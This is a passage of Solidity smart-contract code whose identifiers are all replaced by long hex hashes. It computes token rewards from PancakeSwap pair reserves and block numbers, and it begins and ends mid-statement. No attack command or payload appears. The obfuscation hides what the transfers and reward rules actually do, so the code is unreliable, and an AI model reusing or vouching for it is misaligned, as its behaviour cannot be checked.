Ox1619f6d175e0aadb3482e2c5f1f52aa9bdf53b7c8a331173ccd6560c30bfb42a6e6037da39ed4c11d7d1086f995b514e3f09158461cf79587c486ad9a692b82c - Ox31695c593ab3617431d843f63abb28bba22fa063bb6b68db0b860fb32bff52326e599e37d76f6d3458ee6e3cdcea9dab834b2dbd6ed582d56eaadf8d349367de;Ox958316d51963e8a542fc010a6427ae86d8a14ab83d60a4a2c0dc3ef052070311f88ab31684827aac898b500a838a100b55fe89ee429099d93f06c6e4b8f16d50 = Ox1619f6d175e0aadb3482e2c5f1f52aa9bdf53b7c8a331173ccd6560c30bfb42a6e6037da39ed4c11d7d1086f995b514e3f09158461cf79587c486ad9a692b82c * Ox604e19fd903161bd800e6c4892228398a1adef6b53ad6e9cfbced15312c6deb82479978bfcdb649d46e0ba3abf2d48f357cbecd37c566c92b4c48c4fe6febff7;Ox604e19fd903161bd800e6c4892228398a1adef6b53ad6e9cfbced15312c6deb82479978bfcdb649d46e0ba3abf2d48f357cbecd37c566c92b4c48c4fe6febff7 = Ox958316d51963e8a542fc010a6427ae86d8a14ab83d60a4a2c0dc3ef052070311f88ab31684827aac898b500a838a100b55fe89ee429099d93f06c6e4b8f16d50 / Ox1619f6d175e0aadb3482e2c5f1f52aa9bdf53b7c8a331173ccd6560c30bfb42a6e6037da39ed4c11d7d1086f995b514e3f09158461cf79587c486ad9a692b82c;Oxb0358942bb83789056bd0d1fee7b633561376a32e0fd4775d2942001675b09d12de127251763e624e9f642e9dc750547b975ed34af60a91287d14c60bc0acdec[Oxbcda5a3b450351a5a14dd577060a16e39f940b264c6462b7ee2085913526b1c6cfc0053f70ce9b98b5b2276e893fedc03e7c8e5472c99655ffddcb8cda240819] = 0;emit Ox284f3167879e00bc7988a523a5781ac7df8cae3708ddfc89970e5c67380022954154ce862d5b0c799b0199aaf09baa2cf2a59552406b81fbb48e4d2ac9110d9b(Ox31695c593ab3617431d843f63abb28bba22fa063bb6b68db0b860fb32bff52326e599e37d76f6d3458ee6e3cdcea9dab834b2dbd6ed582d56eaadf8d349367de, Ox1619f6d175e0aadb3482e2c5f1f52aa9bdf53b7c8a331173ccd6560c30bfb42a6e6037da39ed4c11d7d1086f995b514e3f09158461cf79587c486ad9a692b82c, Oxe35a900d9aaca65c3304c8253063b8053df3b1829bd2907ce59e4a2913bf2b66ca726e58ae079ac138667c48e81af791538643d7c6abf50d688ffc73d4aad787, Ox5fa84fa7a499e73f1fce17c48b26fbeadfe94d1c8c73437307e23ad6b12f285cb7f4affbcc9b663b60b765c0ac73a43df82445db4f5fdba5fbf6653874da4ad3, sgoTOx30ac86e6cf2feabcf31914c26c72ecfb027e87cdf9118a747299d943171e57354fd6a49813af09aa482ca33fde00dcd52f9e206601c397a820abe4c65a80be81, Ox9b44a1d7a45b9623906a6981c13f16a0cbc1f9688293234a053d86073e590e0dee167333f3e0613d8a3ec8198a0f72535e40a522c9c9a8aa4a029bfd5800cc4e.Ox9d36153e52001dc3612238ff2616f960ecd284475e6909d8df851ea75c0ea398495e9bf6a484425bc4bbc006b9056a310e9c81be0ac9142903746b41ab5eb515, Ox6f2aa5c88a31e66067f4ffa99d03c38d7e20d47960896e43060909b100061cc9752ccd1234e40442f8cb80c3e94d7ae47b86478a251281e2018463ce3e1013f1, Ox80019c3fe8aa3028afd0345e2b0aab857f9f4ff376b2a28426e85ef3c1908b5c8eec1f81b7e8ea284761d4777d9384ca2a8f181eedd425891221f2a39089d415);}}function Oxedf11956c89ac5e6abf73116d5ebc155f14b3384216c736faa36b5b2d583adba05eb913d6f6dfe7a13be4750089058dcd801ab63708001f545351acd120476bc (uint256 Ox15d14a023d6a51f939de66d0df6e0421da84ee7373a41461170e3d247a739dab9ea3a9bcaead58cd30d36e15aacd5d229cfb0aef932afcc0f777e9b47303ba32, address Ox6ee7e94aa7c62ba4b86c8ab75796512fa5d041de9708afb5d1b60a876912f57e9deaeb49df698ab970cc3e64d09a1c3a33e86f4957352ca30d42603ed0ff6cce) internal{uint256 Oxc6038bc6abc28016156b900f4cef4cea67fba4b79e8971c09ec23ab217cb7edfe861a33de338ae49fc5cadd05502d4c61db25c89f962a471fcf31f1be53f1e36 = Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox6ee7e94aa7c62ba4b86c8ab75796512fa5d041de9708afb5d1b60a876912f57e9deaeb49df698ab970cc3e64d09a1c3a33e86f4957352ca30d42603ed0ff6cce].Oxb3124d8d7849f2d02c1b189f919aca91a55b7c48bfcac78ff415437af947140c204ae87b098bb0345ad6710c1c73ee690ddfdb005745b3ab52b090f6ec8f0d02;uint256 Oxe35a900d9aaca65c3304c8253063b8053df3b1829bd2907ce59e4a2913bf2b66ca726e58ae079ac138667c48e81af791538643d7c6abf50d688ffc73d4aad787;uint256 Ox80019c3fe8aa3028afd0345e2b0aab857f9f4ff376b2a28426e85ef3c1908b5c8eec1f81b7e8ea284761d4777d9384ca2a8f181eedd425891221f2a39089d415;IPancakeSwapPair Ox8d50d21db24c97198b029aa543ec857a2ae54a3d566cd4685a98bb13df6cb005f70600d7ed59205660bc993cf409136432c6415a44a306e673a3468f3e61e61d = Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox6ee7e94aa7c62ba4b86c8ab75796512fa5d041de9708afb5d1b60a876912f57e9deaeb49df698ab970cc3e64d09a1c3a33e86f4957352ca30d42603ed0ff6cce].Oxf1c9f443e2204d36184a898405024370822695a0c30eb9e7e9e9ca9ed056049781cec83f110db2708e2719707bb0b8f746b9d2548f8f9a3f39bc912676a017e0;uint256 Oxfd7910d1ca74cd432a96a227ff5f090bce2254c2fd442f27355c58c09c575fc52db604c1fa2a5ae774d936675f49316f31d7b1893159497ed94c52c56dc9dea8;if(Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox6ee7e94aa7c62ba4b86c8ab75796512fa5d041de9708afb5d1b60a876912f57e9deaeb49df698ab970cc3e64d09a1c3a33e86f4957352ca30d42603ed0ff6cce].Ox498143c462b89bfd2609990103448fc665bedd3241b988e00df864129126a45cfc1eed7463958a3ff1ebac1f7aa2040cd65634072c4bcc69c7cb911c82bb5ca6 > 0 && Ox15d14a023d6a51f939de66d0df6e0421da84ee7373a41461170e3d247a739dab9ea3a9bcaead58cd30d36e15aacd5d229cfb0aef932afcc0f777e9b47303ba32 == 0) {if(Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox6ee7e94aa7c62ba4b86c8ab75796512fa5d041de9708afb5d1b60a876912f57e9deaeb49df698ab970cc3e64d09a1c3a33e86f4957352ca30d42603ed0ff6cce].Ox685f8edeac7c4a625d1e7969fb6c939eb7fe8dbab21c868063ce1d8501e78a0b0518cb0f95bdf025bd9edbfe56058ad9dcd0de7b61055df11b7e407ca3d5543c != IPancakeSwapPair(Oxef55ae916f742ac9bae1ed72794c843579775b6fc9c0a19a27c2d7b097cd2b55a5cee1c9259379581d22fb5c2e36899c1f8697a17a711998c2149183dcdc9728)) {if(block.number > Ox7d8320f8a24ed1ba028759ecb5657cc8080eba0466f1714748e12069aeb50f2638b8b29924116ab4cb30e5614e9fad4f4d517dfa7aa92378265539a912d86670[Ox6ee7e94aa7c62ba4b86c8ab75796512fa5d041de9708afb5d1b60a876912f57e9deaeb49df698ab970cc3e64d09a1c3a33e86f4957352ca30d42603ed0ff6cce]) {Ox7d8320f8a24ed1ba028759ecb5657cc8080eba0466f1714748e12069aeb50f2638b8b29924116ab4cb30e5614e9fad4f4d517dfa7aa92378265539a912d86670[Ox6ee7e94aa7c62ba4b86c8ab75796512fa5d041de9708afb5d1b60a876912f57e9deaeb49df698ab970cc3e64d09a1c3a33e86f4957352ca30d42603ed0ff6cce] = block.number+Oxfd3352e517111b483889d7a73f91ddc63bf9801be4b97b8fae8c5a5948e15492dae9f6f7798a9f7f265f791d7413f58b165d77cbf72c931b7febb6b9266affd1;Oxe35a900d9aaca65c3304c8253063b8053df3b1829bd2907ce59e4a2913bf2b66ca726e58ae079ac138667c48e81af791538643d7c6abf50d688ffc73d4aad787 = Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox6ee7e94aa7c62ba4b86c8ab75796512fa5d041de9708afb5d1b60a876912f57e9deaeb49df698ab970cc3e64d09a1c3a33e86f4957352ca30d42603ed0ff6cce].Ox9b8eb55defbcb1608bc4f0e8674f8cdaab800824252596a6cecaebab5938b98a6ddab9c1cc6bf1998ab8e6266a5f58caa9e691eff25a4ff2066260a0c2f86c01 = ((Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox6ee7e94aa7c62ba4b86c8ab75796512fa5d041de9708afb5d1b60a876912f57e9deaeb49df698ab970cc3e64d09a1c3a33e86f4957352ca30d42603ed0ff6cce].Ox9b8eb55defbcb1608bc4f0e8674f8cdaab800824252596a6cecaebab5938b98a6ddab9c1cc6bf1998ab8e6266a5f58caa9e691eff25a4ff2066260a0c2f86c01*(Ox9b44a1d7a45b9623906a6981c13f16a0cbc1f9688293234a053d86073e590e0dee167333f3e0613d8a3ec8198a0f72535e40a522c9c9a8aa4a029bfd5800cc4e.Ox9d36153e52001dc3612238ff2616f960ecd284475e6909d8df851ea75c0ea398495e9bf6a484425bc4bbc006b9056a310e9c81be0ac9142903746b41ab5eb515-1))+Ox2098427df852c883700a209b463936448438ad387c7fc0dcb7032a10e93c0f4aee8182532d26000329706ec0258c06d14ac9a5fc689b192bf17a7ef285e9e165(Ox6ee7e94aa7c62ba4b86c8ab75796512fa5d041de9708afb5d1b60a876912f57e9deaeb49df698ab970cc3e64d09a1c3a33e86f4957352ca30d42603ed0ff6cce))/Ox9b44a1d7a45b9623906a6981c13f16a0cbc1f9688293234a053d86073e590e0dee167333f3e0613d8a3ec8198a0f72535e40a522c9c9a8aa4a029bfd5800cc4e.Ox9d36153e52001dc3612238ff2616f960ecd284475e6909d8df851ea75c0ea398495e9bf6a484425bc4bbc006b9056a310e9c81be0ac9142903746b41ab5eb515;}} else Oxe35a900d9aaca65c3304c8253063b8053df3b1829bd2907ce59e4a2913bf2b66ca726e58ae079ac138667c48e81af791538643d7c6abf50d688ffc73d4aad787 = Ox34a97b4b76be7c2f2948eae45035962c11c933da0e12ad4c1e7a61e3478f7c5bec49384a6c7b6305cecb86edaecf45eed73bb97639c028d57496fd61a6ff684b(Ox546481c5b4a41f4d6d1a980974a419ca762f5ba02c38601c9d721a4a516be6e73a48ea5b01cc29bba06d4ef08d538b176097dfbf1bbb2a695026da4e89daa3dc);if(Oxe35a900d9aaca65c3304c8253063b8053df3b1829bd2907ce59e4a2913bf2b66ca726e58ae079ac138667c48e81af791538643d7c6abf50d688ffc73d4aad787 > 0 && Oxc6038bc6abc28016156b900f4cef4cea67fba4b79e8971c09ec23ab217cb7edfe861a33de338ae49fc5cadd05502d4c61db25c89f962a471fcf31f1be53f1e36 > 0) {address Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150 = Ox8d50d21db24c97198b029aa543ec857a2ae54a3d566cd4685a98bb13df6cb005f70600d7ed59205660bc993cf409136432c6415a44a306e673a3468f3e61e61d.token0();address Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3 = Ox8d50d21db24c97198b029aa543ec857a2ae54a3d566cd4685a98bb13df6cb005f70600d7ed59205660bc993cf409136432c6415a44a306e673a3468f3e61e61d.token1();address Ox1b111dbf483e0b18886edf01083cc917ce3e1b49fd70a88428c12206079b47d5e8776fddb595222011e1ce2de9fd0ee7ee64fa1a218ca7f39937732aa90a2a36 = Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3;(Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150, Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3) = Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150 < Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3 ? (Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150, Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3) : (Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3, Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150);(uint Ox7cc61b8f8bbf1d8b779ae7be72dd08b91d8f71264506b6c5f32d7bd1355d7555f3b0c08919aba3725dd851df1710829886f0dbb53ea9bda3d83bf2a72df16b73, uint Oxf433840df9ea6065bd275a3a500af406b3a219a6edd720d4ffc1fb8847df855abb7f44affb08664aa9cc34775fc04bb524168e980ed36ec5e0ecc007acadfa5b,) = Ox8d50d21db24c97198b029aa543ec857a2ae54a3d566cd4685a98bb13df6cb005f70600d7ed59205660bc993cf409136432c6415a44a306e673a3468f3e61e61d.getReserves();(Ox7cc61b8f8bbf1d8b779ae7be72dd08b91d8f71264506b6c5f32d7bd1355d7555f3b0c08919aba3725dd851df1710829886f0dbb53ea9bda3d83bf2a72df16b73, Oxf433840df9ea6065bd275a3a500af406b3a219a6edd720d4ffc1fb8847df855abb7f44affb08664aa9cc34775fc04bb524168e980ed36ec5e0ecc007acadfa5b, Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150, Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3) = Ox1b111dbf483e0b18886edf01083cc917ce3e1b49fd70a88428c12206079b47d5e8776fddb595222011e1ce2de9fd0ee7ee64fa1a218ca7f39937732aa90a2a36 == Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3 && Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3 == address(this) ? (Ox7cc61b8f8bbf1d8b779ae7be72dd08b91d8f71264506b6c5f32d7bd1355d7555f3b0c08919aba3725dd851df1710829886f0dbb53ea9bda3d83bf2a72df16b73, Oxf433840df9ea6065bd275a3a500af406b3a219a6edd720d4ffc1fb8847df855abb7f44affb08664aa9cc34775fc04bb524168e980ed36ec5e0ecc007acadfa5b, Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150, Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3) : (Oxf433840df9ea6065bd275a3a500af406b3a219a6edd720d4ffc1fb8847df855abb7f44affb08664aa9cc34775fc04bb524168e980ed36ec5e0ecc007acadfa5b, Ox7cc61b8f8bbf1d8b779ae7be72dd08b91d8f71264506b6c5f32d7bd1355d7555f3b0c08919aba3725dd851df1710829886f0dbb53ea9bda3d83bf2a72df16b73, Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3, Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150);uint256 Ox498143c462b89bfd2609990103448fc665bedd3241b988e00df864129126a45cfc1eed7463958a3ff1ebac1f7aa2040cd65634072c4bcc69c7cb911c82bb5ca6 = Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox6ee7e94aa7c62ba4b86c8ab75796512fa5d041de9708afb5d1b60a876912f57e9deaeb49df698ab970cc3e64d09a1c3a33e86f4957352ca30d42603ed0ff6cce].Ox498143c462b89bfd2609990103448fc665bedd3241b988e00df864129126a45cfc1eed7463958a3ff1ebac1f7aa2040cd65634072c4bcc69c7cb911c82bb5ca6;   if(Oxf433840df9ea6065bd275a3a500af406b3a219a6edd720d4ffc1fb8847df855abb7f44affb08664aa9cc34775fc04bb524168e980ed36ec5e0ecc007acadfa5b < 200 * 1e18 || Oxb82f32743aed2226cc3334921d3648859264f213ec9829bb74596bd7aa99e85284e02c08e36ba448789a9a633dfe09bc27662257f8dc43dee51b7c6b39e498b4(1e18) < Ox9b44a1d7a45b9623906a6981c13f16a0cbc1f9688293234a053d86073e590e0dee167333f3e0613d8a3ec8198a0f72535e40a522c9c9a8aa4a029bfd5800cc4e.Oxca8ed0779f6d1b8223cd78ca07b17d88ea4a64154e7d8972d88d06be7d057c84b8ddb6718f120e06a989b5b47471303120bf565a878741db4422aa5a4441a8b6) Ox498143c462b89bfd2609990103448fc665bedd3241b988e00df864129126a45cfc1eed7463958a3ff1ebac1f7aa2040cd65634072c4bcc69c7cb911c82bb5ca6 = 0;else if(Oxf433840df9ea6065bd275a3a500af406b3a219a6edd720d4ffc1fb8847df855abb7f44affb08664aa9cc34775fc04bb524168e980ed36ec5e0ecc007acadfa5b < 1000 * 1e18) Ox498143c462b89bfd2609990103448fc665bedd3241b988e00df864129126a45cfc1eed7463958a3ff1ebac1f7aa2040cd65634072c4bcc69c7cb911c82bb5ca6 = (Ox498143c462b89bfd2609990103448fc665bedd3241b988e00df864129126a45cfc1eed7463958a3ff1ebac1f7aa2040cd65634072c4bcc69c7cb911c82bb5ca6 * 700) / 1000;Oxfd7910d1ca74cd432a96a227ff5f090bce2254c2fd442f27355c58c09c575fc52db604c1fa2a5ae774d936675f49316f31d7b1893159497ed94c52c56dc9dea8 = (Ox7cc61b8f8bbf1d8b779ae7be72dd08b91d8f71264506b6c5f32d7bd1355d7555f3b0c08919aba3725dd851df1710829886f0dbb53ea9bda3d83bf2a72df16b73* (1e18/Ox47b6102ae26e0d58f4db93b9338436fa6efea1617c70ad990eb26c1bcc7d24adb7119bae6c49015cd4014be696a37dac1d0276b142b823aa5dad063557144be2[Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150]) * Oxe35a900d9aaca65c3304c8253063b8053df3b1829bd2907ce59e4a2913bf2b66ca726e58ae079ac138667c48e81af791538643d7c6abf50d688ffc73d4aad787) / Oxc6038bc6abc28016156b900f4cef4cea67fba4b79e8971c09ec23ab217cb7edfe861a33de338ae49fc5cadd05502d4c61db25c89f962a471fcf31f1be53f1e36;if(Oxf433840df9ea6065bd275a3a500af406b3a219a6edd720d4ffc1fb8847df855abb7f44affb08664aa9cc34775fc04bb524168e980ed36ec5e0ecc007acadfa5b > Oxfd7910d1ca74cd432a96a227ff5f090bce2254c2fd442f27355c58c09c575fc52db604c1fa2a5ae774d936675f49316f31d7b1893159497ed94c52c56dc9dea8) Oxfd7910d1ca74cd432a96a227ff5f090bce2254c2fd442f27355c58c09c575fc52db604c1fa2a5ae774d936675f49316f31d7b1893159497ed94c52c56dc9dea8 = ((Oxf433840df9ea6065bd275a3a500af406b3a219a6edd720d4ffc1fb8847df855abb7f44affb08664aa9cc34775fc04bb524168e980ed36ec5e0ecc007acadfa5b - Oxfd7910d1ca74cd432a96a227ff5f090bce2254c2fd442f27355c58c09c575fc52db604c1fa2a5ae774d936675f49316f31d7b1893159497ed94c52c56dc9dea8) * Ox498143c462b89bfd2609990103448fc665bedd3241b988e00df864129126a45cfc1eed7463958a3ff1ebac1f7aa2040cd65634072c4bcc69c7cb911c82bb5ca6) / 1000;else Oxfd7910d1ca74cd432a96a227ff5f090bce2254c2fd442f27355c58c09c575fc52db604c1fa2a5ae774d936675f49316f31d7b1893159497ed94c52c56dc9dea8 = 0;Oxfd7910d1ca74cd432a96a227ff5f090bce2254c2fd442f27355c58c09c575fc52db604c1fa2a5ae774d936675f49316f31d7b1893159497ed94c52c56dc9dea8 = Ox81d555e9f731b2b6229b649d675cda6615a28d7156a07cf3405bc7e8ac0fbf008543310ade625b0c3da35cbecba67d0b373bde4a166813c71bd1d261414affbb(Oxfd7910d1ca74cd432a96a227ff5f090bce2254c2fd442f27355c58c09c575fc52db604c1fa2a5ae774d936675f49316f31d7b1893159497ed94c52c56dc9dea8, Ox6ee7e94aa7c62ba4b86c8ab75796512fa5d041de9708afb5d1b60a876912f57e9deaeb49df698ab970cc3e64d09a1c3a33e86f4957352ca30d42603ed0ff6cce);}if(Oxfd7910d1ca74cd432a96a227ff5f090bce2254c2fd442f27355c58c09c575fc52db604c1fa2a5ae774d936675f49316f31d7b1893159497ed94c52c56dc9dea8 > 0) Ox03dedf8d06303c98f2fb0b36422564fcde64d2ddcd196ee86fc4ddb5cbf277b8d5c28008aca11f27b9c0949154f0d1f8f2e9b1b70473a34c44ce9e959c666546(Ox6ee7e94aa7c62ba4b86c8ab75796512fa5d041de9708afb5d1b60a876912f57e9deaeb49df698ab970cc3e64d09a1c3a33e86f4957352ca30d42603ed0ff6cce, Oxbcda5a3b450351a5a14dd577060a16e39f940b264c6462b7ee2085913526b1c6cfc0053f70ce9b98b5b2276e893fedc03e7c8e5472c99655ffddcb8cda240819, Oxfd7910d1ca74cd432a96a227ff5f090bce2254c2fd442f27355c58c09c575fc52db604c1fa2a5ae774d936675f49316f31d7b1893159497ed94c52c56dc9dea8);} else if(Ox15d14a023d6a51f939de66d0df6e0421da84ee7373a41461170e3d247a739dab9ea3a9bcaead58cd30d36e15aacd5d229cfb0aef932afcc0f777e9b47303ba32 != 0) {uint256 Ox469ca1feae59b04a92204cde0e18d5f43e360deacc81a78b7e806823c837897a2c93f147a7ec075abf0ed4f04fa514da3f1a0c7a0d29bfdb80f45426bb4e133b = Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox6ee7e94aa7c62ba4b86c8ab75796512fa5d041de9708afb5d1b60a876912f57e9deaeb49df698ab970cc3e64d09a1c3a33e86f4957352ca30d42603ed0ff6cce].Ox469ca1feae59b04a92204cde0e18d5f43e360deacc81a78b7e806823c837897a2c93f147a7ec075abf0ed4f04fa514da3f1a0c7a0d29bfdb80f45426bb4e133b;uint256 Oxd35685d7d916f121a89626c94442694562c0455e77c00f424d988f7015079682244b40da8ecb8e0e5b0207dd944b511b6d99d15b9c65860f6314a86d420d072e = Oxb0358942bb83789056bd0d1fee7b633561376a32e0fd4775d2942001675b09d12de127251763e624e9f642e9dc750547b975ed34af60a91287d14c60bc0acdec[Ox6ee7e94aa7c62ba4b86c8ab75796512fa5d041de9708afb5d1b60a876912f57e9deaeb49df698ab970cc3e64d09a1c3a33e86f4957352ca30d42603ed0ff6cce] / Ox604e19fd903161bd800e6c4892228398a1adef6b53ad6e9cfbced15312c6deb82479978bfcdb649d46e0ba3abf2d48f357cbecd37c566c92b4c48c4fe6febff7;if(Oxd35685d7d916f121a89626c94442694562c0455e77c00f424d988f7015079682244b40da8ecb8e0e5b0207dd944b511b6d99d15b9c65860f6314a86d420d072e < 200 * 1e18 || Oxb82f32743aed2226cc3334921d3648859264f213ec9829bb74596bd7aa99e85284e02c08e36ba448789a9a633dfe09bc27662257f8dc43dee51b7c6b39e498b4(1e18) < Ox9b44a1d7a45b9623906a6981c13f16a0cbc1f9688293234a053d86073e590e0dee167333f3e0613d8a3ec8198a0f72535e40a522c9c9a8aa4a029bfd5800cc4e.Oxca8ed0779f6d1b8223cd78ca07b17d88ea4a64154e7d8972d88d06be7d057c84b8ddb6718f120e06a989b5b47471303120bf565a878741db4422aa5a4441a8b6) Ox469ca1feae59b04a92204cde0e18d5f43e360deacc81a78b7e806823c837897a2c93f147a7ec075abf0ed4f04fa514da3f1a0c7a0d29bfdb80f45426bb4e133b = 0;else if(Oxd35685d7d916f121a89626c94442694562c0455e77c00f424d988f7015079682244b40da8ecb8e0e5b0207dd944b511b6d99d15b9c65860f6314a86d420d072e < 1000 * 1e18) Ox469ca1feae59b04a92204cde0e18d5f43e360deacc81a78b7e806823c837897a2c93f147a7ec075abf0ed4f04fa514da3f1a0c7a0d29bfdb80f45426bb4e133b = (Ox469ca1feae59b04a92204cde0e18d5f43e360deacc81a78b7e806823c837897a2c93f147a7ec075abf0ed4f04fa514da3f1a0c7a0d29bfdb80f45426bb4e133b * 700)/ 1000;uint256 delta = ((Oxd35685d7d916f121a89626c94442694562c0455e77c00f424d988f7015079682244b40da8ecb8e0e5b0207dd944b511b6d99d15b9c65860f6314a86d420d072e - (Oxb0358942bb83789056bd0d1fee7b633561376a32e0fd4775d2942001675b09d12de127251763e624e9f642e9dc750547b975ed34af60a91287d14c60bc0acdec[Ox6ee7e94aa7c62ba4b86c8ab75796512fa5d041de9708afb5d1b60a876912f57e9deaeb49df698ab970cc3e64d09a1c3a33e86f4957352ca30d42603ed0ff6cce] / Ox15d14a023d6a51f939de66d0df6e0421da84ee7373a41461170e3d247a739dab9ea3a9bcaead58cd30d36e15aacd5d229cfb0aef932afcc0f777e9b47303ba32)) * Ox469ca1feae59b04a92204cde0e18d5f43e360deacc81a78b7e806823c837897a2c93f147a7ec075abf0ed4f04fa514da3f1a0c7a0d29bfdb80f45426bb4e133b) / 1000;delta = Ox81d555e9f731b2b6229b649d675cda6615a28d7156a07cf3405bc7e8ac0fbf008543310ade625b0c3da35cbecba67d0b373bde4a166813c71bd1d261414affbb(delta, Ox6ee7e94aa7c62ba4b86c8ab75796512fa5d041de9708afb5d1b60a876912f57e9deaeb49df698ab970cc3e64d09a1c3a33e86f4957352ca30d42603ed0ff6cce);if(delta>0 && !Ox0c8d6de5ea1e5aa05d7c247bded0351923f1ea87f987037d60a8be779d10220db90ad2e41ffd8d7896eb45a66699379b52bbe6406cd0f3feb72822fac2173eaa && Ox469ca1feae59b04a92204cde0e18d5f43e360deacc81a78b7e806823c837897a2c93f147a7ec075abf0ed4f04fa514da3f1a0c7a0d29bfdb80f45426bb4e133b > 0) Ox03dedf8d06303c98f2fb0b36422564fcde64d2ddcd196ee86fc4ddb5cbf277b8d5c28008aca11f27b9c0949154f0d1f8f2e9b1b70473a34c44ce9e959c666546(Ox6ee7e94aa7c62ba4b86c8ab75796512fa5d041de9708afb5d1b60a876912f57e9deaeb49df698ab970cc3e64d09a1c3a33e86f4957352ca30d42603ed0ff6cce, Oxbcda5a3b450351a5a14dd577060a16e39f940b264c6462b7ee2085913526b1c6cfc0053f70ce9b98b5b2276e893fedc03e7c8e5472c99655ffddcb8cda240819, delta);Ox80019c3fe8aa3028afd0345e2b0aab857f9f4ff376b2a28426e85ef3c1908b5c8eec1f81b7e8ea284761d4777d9384ca2a8f181eedd425891221f2a39089d415 = 1;Oxe35a900d9aaca65c3304c8253063b8053df3b1829bd2907ce59e4a2913bf2b66ca726e58ae079ac138667c48e81af791538643d7c6abf50d688ffc73d4aad787 = (Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox6ee7e94aa7c62ba4b86c8ab75796512fa5d041de9708afb5d1b60a876912f57e9deaeb49df698ab970cc3e64d09a1c3a33e86f4957352ca30d42603ed0ff6cce].Ox685f8edeac7c4a625d1e7969fb6c939eb7fe8dbab21c868063ce1d8501e78a0b0518cb0f95bdf025bd9edbfe56058ad9dcd0de7b61055df11b7e407ca3d5543c != IPancakeSwapPair(Oxef55ae916f742ac9bae1ed72794c843579775b6fc9c0a19a27c2d7b097cd2b55a5cee1c9259379581d22fb5c2e36899c1f8697a17a711998c2149183dcdc9728)) ? 